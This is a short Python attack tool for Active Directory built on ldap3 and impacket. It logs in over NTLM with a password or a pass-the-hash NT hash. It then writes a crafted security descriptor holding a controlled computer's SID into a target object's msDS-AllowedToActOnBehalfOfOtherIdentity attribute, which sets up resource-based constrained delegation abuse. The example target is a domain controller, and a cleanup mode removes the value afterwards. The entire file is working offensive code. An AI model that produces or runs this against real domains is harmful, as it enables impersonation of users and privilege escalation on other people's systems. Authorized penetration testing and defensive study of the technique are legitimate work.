#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, MODIFY_REPLACE, NTLM, MODIFY_DELETE
from binascii import unhexlify
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
import argparse

parser = argparse.ArgumentParser(description='Set SD for controlled computer object to a target object for RBCD')
parser.add_argument('-u','--username',  help='username for LDAP', required=True)
group = parser.add_mutually_exclusive_group()
group.add_argument('-p','--password',  help='password for LDAP')
group.add_argument('-H','--hash',  help='LM:NT hash for LDAP')
parser.add_argument('-d','--domain',  help='LDAP server/domain', required=True)
parser.add_argument('-t','--targetDn',  help='Target distinguishedName (Example: "CN=DC1,OU=Domain Controllers,DC=lab,DC=local")', required=True)
parser.add_argument('-c','--contrDn', help='Controlled computer distingushedName to add to msDS-AllowedToActOnBehalfOfOtherIdentity attribute', required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server, in case it cant resolve', required=False)
parser.add_argument('--cleanup', help='Delete msDS-AllowedToActOnBehalfOfOtherIdentity value',action='store_true', required=False)


def main():
    args = parser.parse_args()
    if (args.ldapserver):
        server = args.ldapserver
    else:
        server = args.domain

    username = "{}\\{}".format(args.domain, args.username)
    s = Server(server, get_info=ALL)
    if (args.password):
        conn = Connection(s, user=username, password=args.password, authentication=NTLM, auto_bind=True)
    else:
        conn = Connection(s, user=username, password=args.hash, authentication=NTLM, auto_bind=True)

    conn.search(args.contrDn,"(objectClass=Computer)",attributes=['objectSID'])
    contrSid = conn.entries[0]['objectSID'].raw_values[0]

    #SD full value with removed SID
    sd_bytes = unhexlify(b'010004804000000000000000000000001400000004002c000100000000002400ff010f000000000000000000000000000000000000000000000000000000000001020000000000052000000020020000')
    sd = SR_SECURITY_DESCRIPTOR(data=sd_bytes)
    sd['Dacl'].aces[0].fields['Ace'].fields['Sid'].setData(contrSid)

    if (args.cleanup == True):
        if(conn.modify(args.targetDn,{'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_DELETE, []]})):
            print("Successfully cleaned up!")
        else:
            print("An error was encountered, D:")
    else:
        if (conn.modify(args.targetDn,{'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, sd.getData()]})):
            print("Successfully added permissions!")
        else:
            print("An error was encountered, D:")


if __name__ == "__main__":
    main()
